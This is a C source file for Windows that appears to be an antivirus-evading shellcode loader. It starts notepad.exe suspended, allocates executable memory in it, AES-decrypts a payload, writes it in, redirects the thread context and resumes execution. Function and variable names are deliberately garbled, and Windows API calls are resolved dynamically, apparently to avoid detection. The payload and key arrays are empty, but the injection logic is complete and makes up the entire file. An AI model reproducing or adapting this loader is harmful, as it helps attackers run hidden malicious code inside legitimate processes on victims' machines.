
#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void ases123enc(char* code1299d, DWORD code1299dLen, char* k27eykk, DWORD k27eykkLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)k27eykk, k27eykkLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)code1299d, &code1299dLen);
CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

int main() {

    STARTUPINFO ga = {0};
    PROCESS_INFORMATION pi = {0};
    ga.cb = sizeof(ga);
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    unsigned char ke185hams[] = {};
    BOOL (*pCreateProcess)(
        LPCSTR lpApplicationName,
        LPSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCSTR lpCurrentDirectory,
        LPSTARTUPINFOA lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    ) = (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        GetProcAddress(hKernel32, "CreateProcessA");

    pCreateProcess("C:\\Windows\\System32\\notepad.exe", 0, 0, 0, FALSE,CREATE_SUSPENDED, 0, 0, &ga, &pi);
      

    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    GetThreadContext(pi.hThread, &ctx);
unsigned char itsthecod345[] = {};

    
LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
    LPVOID memlo = pVirtualAllnocEkx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    ases123enc((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
    
    BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
    (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(hKernel32, "WriteProcessMemory");

    pWriteProcessM(pi.hProcess, memlo, itsthecod345, sizeof(itsthecod345), NULL);
    ctx.Rcx = (DWORD64)memlo; 
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread); 


    return 0;
}
